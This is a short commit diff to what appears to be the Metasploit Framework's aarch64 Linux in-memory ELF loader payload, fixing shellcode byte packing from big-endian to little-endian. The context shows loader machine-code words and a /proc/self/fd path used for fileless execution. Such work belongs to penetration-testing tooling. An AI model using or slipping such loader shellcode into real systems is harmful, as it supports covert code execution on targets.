91bb23f41d97b01a4c44a954e0d39e632f337072
Diego Ledda <diego_ledda@rapid7.com>
2025-11-11 11:33:58 +0100

    Update lib/msf/core/payload/linux/aarch64/elf_loader.rb
    fix aarch64 packing

--- lib/msf/core/payload/linux/aarch64/elf_loader.rb
+++ lib/msf/core/payload/linux/aarch64/elf_loader.rb
@@ -59,7 +59,7 @@ module Msf::Payload::Linux::Aarch64::ElfLoader
       0xa81b80d2, # 0x1090:	mov	x8, #0xdd	0xa81b80d2
       0x010000d4, # 0x1094:	svc	#0	0x010000d4
       0xe2ffff97, # 0x1098:	bl	#0x1020	0xe2ffff97,
-    ].pack('N*')
+    ].pack('V*')
     fd_path = '/proc/self/fd/'.bytes.pack('c*') + "\x00" * 16
     in_memory_loader + [payload.length].pack('V*') + fd_path
   end
